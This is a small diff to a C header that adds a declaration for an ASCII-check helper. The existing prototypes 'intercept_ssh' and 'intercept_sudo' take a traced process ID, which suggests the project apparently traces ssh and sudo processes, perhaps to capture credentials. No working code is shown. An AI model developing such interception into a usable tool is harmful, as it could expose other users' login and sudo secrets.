@@ -53,6 +53,7 @@ void free_process_username(void);
 //Forward declaration to avoid circular dependancy
 void intercept_ssh(pid_t traced_process);
 void intercept_sudo(pid_t traced_process);
+int strnascii(const char *string, size_t length);
 
 
 #endif
